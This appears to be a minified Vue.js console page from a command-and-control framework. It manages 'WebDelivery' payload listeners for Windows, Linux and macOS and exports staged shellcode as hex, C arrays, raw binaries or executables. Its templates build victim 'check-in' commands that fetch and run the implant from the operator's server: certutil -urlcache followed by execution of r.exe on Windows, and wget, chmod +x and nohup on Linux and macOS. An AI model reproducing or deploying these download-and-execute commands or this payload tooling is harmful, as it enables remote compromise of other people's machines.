import{_ as Y}from"./e1619f58.js";/* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        */import{C as _}from"./e021e21f.js";import{a as n,o as Z,t as ee,r as le,D as te,u as ae,v as oe,w as se,x as ne,y as re,z as de,A as ie,p as ue}from"./431e6e02.js";import{H as me,r as b,_ as P,d as pe,l as d,m as S,V as l,P as o,T as u,U as ce,O as w,S as x,p as k,F as O,a8 as W,az as fe,aA as _e}from"./95bbca75.js";const R=g=>(fe("data-v-4bd1f03f"),g=g(),_e(),g),be=R(()=>k("br",null,null,-1)),we=R(()=>k("br",null,null,-1)),ve={class:"form-container"},ye={class:"form-container"},ge=me({__name:"WebDelivery",setup(g){const $=b([]),v=b(!1),z=b([]),T=async()=>{const a=await _.ShowListener();a.status===200?a.data.status===200?z.value=a.data.data:n.error(a.data.data):n.error("Something wrong")},M=[{label:"windows",value:"windows"},{label:"linux",value:"linux"},{label:"darwin",value:"darwin"}],j={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},y=P({format:""}),s=P({port:"",listener:"",os:"",arch:"",filename:"",pass:""}),h=P([]),G=a=>{s.arch="",h.splice(0,h.length,...j[a]||[])},I=b(""),F=b(""),H=a=>{D.value=!0,I.value=a.ListenerConfig,F.value=a.ListeningPort},m=async()=>{const a=await _.GetWebDeliveryList();a.status===200?a.data.status===200?$.value=a.data.data:n.error(a.data.data):n.error("Something wrong")},q=async()=>{const a=await _.StartWebDelivery({listener:s.listener,os:s.os,arch:s.arch,port:s.port,filename:s.filename,pass:s.pass});a.status===200?a.data.status===200?(n.success("添加成功"),await m()):n.error(a.data.data):n.error("Something wrong"),v.value=!1},J=async a=>{const t=await _.CloseWebDelivery({port:a.ListeningPort});t.status===200&&(t.data.status===200?(n.success("关闭成功"),await m()):(await m(),n.error(t.data.data)))},K=async a=>{const t=await _.OpenWebDelivery({port:a.ListeningPort});t.status===200&&(t.data.status===200?(n.success("开启成功"),await m()):(await m(),n.error(t.data.data)))},Q=async a=>{const t=await _.DeleteWebDelivery({port:a.ListeningPort});t.status===200&&(t.data.status===200?(n.success("删除成功"),await m()):(await m(),n.error(t.data.data)))};pe(async()=>{await m()});const D=b(!1),X=async()=>{const a=await _.StageShellCodeGen({listener:I.value,port:F.value,format:y.format});if(a.status===200){n.success("下载成功");const t=a.headers["content-disposition"]||"",r=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(t);let i=r&&r.length>1?decodeURIComponent(r[1].replace(/['"]/g,"")):"exported_file",L=new Blob([a.data],{type:a.headers["content-type"]}),p=document.createElement("a"),V=window.URL.createObjectURL(L);p.href=V,p.download=i,document.body.appendChild(p),p.click(),document.body.removeChild(p),window.URL.revokeObjectURL(V)}else n.error("Something wrong");v.value=!1};return(a,t)=>{const r=Z,i=ee,L=le,p=te,V=ae,c=oe,C=se,f=ne,E=re,N=de,A=ie,B=ue;return d(),S("div",null,[l(r,{type:"primary",size:"default",onClick:t[0]||(t[0]=e=>v.value=!0)},{default:o(()=>[u(" 新增 WebDelivery ")]),_:1}),be,we,l(V,{data:$.value},{default:o(()=>[l(i,{prop:"ListenerConfig",label:"Listener"}),l(i,{prop:"OS",label:"操作系统",width:"150"}),l(i,{prop:"Arch",label:"架构",width:"150"}),l(i,{prop:"Pass",label:"上线密码",width:"150"}),l(i,{prop:"ListeningPort",label:"监听端口",width:"150"}),l(i,{label:"状态",prop:"Status",width:"150"},{default:o(({row:e})=>[l(L,{type:e.Status===1?"success":"danger",size:"default"},{default:o(()=>[u(ce(e.Status===1?"开启":"关闭"),1)]),_:2},1032,["type"])]),_:1}),l(i,{label:"操作"},{default:o(e=>[l(p,{placement:"top",width:500,trigger:"click",content:e.row.OS==="windows"?`certutil -urlcache -split -f ${e.row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${e.row.Pass}`:`wget -P /tmp ${e.row.ServerAddress}; chmod +x /tmp/${e.row.FileName}; nohup /tmp/${e.row.FileName} ${e.row.Pass} > m.log 2>&1 &`},{reference:o(()=>[e.row.Status===1?(d(),w(r,{key:0,size:"small",type:"success"},{default:o(()=>[u("上线命令")]),_:1})):x("",!0)]),_:2},1032,["content"]),e.row.OS==="windows"&&e.row.Status===1?(d(),w(r,{key:0,size:"small",type:"warning",onClick:U=>H(e.row)},{default:o(()=>[u("shellcode生成")]),_:2},1032,["onClick"])):x("",!0),e.row.Status===2?(d(),w(r,{key:1,size:"small",type:"success",onClick:U=>K(e.row)},{default:o(()=>[u("开启")]),_:2},1032,["onClick"])):x("",!0),e.row.Status===1?(d(),w(r,{key:2,size:"small",type:"primary",onClick:U=>J(e.row)},{default:o(()=>[u("关闭")]),_:2},1032,["onClick"])):x("",!0),l(r,{size:"small",type:"danger",onClick:U=>Q(e.row)},{default:o(()=>[u("删除")]),_:2},1032,["onClick"])]),_:1})]),_:1},8,["data"]),l(B,{modelValue:v.value,"onUpdate:modelValue":t[7]||(t[7]=e=>v.value=e),title:"配置WebDelivery"},{default:o(()=>[l(A,{class:"box-card"},{default:o(()=>[k("div",ve,[l(N,{model:s,"label-width":"120px"},{default:o(()=>[l(f,{label:"Listener"},{default:o(()=>[l(C,{modelValue:s.listener,"onUpdate:modelValue":t[1]||(t[1]=e=>s.listener=e),placeholder:"选择listener",onVisibleChange:T},{default:o(()=>[(d(!0),S(O,null,W(z.value,e=>(d(),w(c,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),l(f,{label:"操作系统"},{default:o(()=>[l(C,{modelValue:s.os,"onUpdate:modelValue":t[2]||(t[2]=e=>s.os=e),placeholder:"选择操作系统",onChange:G},{default:o(()=>[(d(),S(O,null,W(M,e=>l(c,{key:e.value,label:e.label,value:e.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),_:1}),l(f,{label:"架构"},{default:o(()=>[l(C,{modelValue:s.arch,"onUpdate:modelValue":t[3]||(t[3]=e=>s.arch=e),placeholder:"选择架构",disabled:h.length===0},{default:o(()=>[(d(!0),S(O,null,W(h,e=>(d(),w(c,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1}),l(f,{label:"上线密码"},{default:o(()=>[l(E,{modelValue:s.pass,"onUpdate:modelValue":t[4]||(t[4]=e=>s.pass=e),style:{width:"220px"},placeholder:"输入上线密码"},null,8,["modelValue"])]),_:1}),l(f,{label:"监听端口"},{default:o(()=>[l(E,{modelValue:s.port,"onUpdate:modelValue":t[5]||(t[5]=e=>s.port=e),style:{width:"200px"},placeholder:"输入监听端口"},null,8,["modelValue"])]),_:1}),l(f,{label:"文件名称"},{default:o(()=>[l(E,{modelValue:s.filename,"onUpdate:modelValue":t[6]||(t[6]=e=>s.filename=e),style:{width:"200px"},placeholder:"输入挂载的文件名称"},null,8,["modelValue"])]),_:1})]),_:1},8,["model"]),l(r,{type:"primary",onClick:q,disabled:!s.os||!s.arch},{default:o(()=>[u(" 确定 ")]),_:1},8,["disabled"])])]),_:1})]),_:1},8,["modelValue"]),l(B,{modelValue:D.value,"onUpdate:modelValue":t[10]||(t[10]=e=>D.value=e),title:"StageShellcode"},{default:o(()=>[l(A,{class:"box-card"},{default:o(()=>[k("div",ye,[l(N,{modelValue:y,"onUpdate:modelValue":t[9]||(t[9]=e=>y=e),"label-width":"120px"},{default:o(()=>[l(f,{label:"输出格式"},{default:o(()=>[l(C,{modelValue:y.format,"onUpdate:modelValue":t[8]||(t[8]=e=>y.format=e),placeholder:"选择输出格式"},{default:o(()=>[l(c,{label:"十六进制 (hex)",value:"hex"}),l(c,{label:"C 数组 (C)",value:"c"}),l(c,{label:"二进制 (bin)",value:"bin"}),l(c,{label:"分阶段可执行程序 (exe)",value:"exe"})]),_:1},8,["modelValue"])]),_:1})]),_:1},8,["modelValue"]),l(r,{type:"primary",onClick:X},{default:o(()=>[u(" 确定 ")]),_:1})])]),_:1})]),_:1},8,["modelValue"])])}}});const $e=Y(ge,[["__scopeId","data-v-4bd1f03f"]]);export{$e as default};
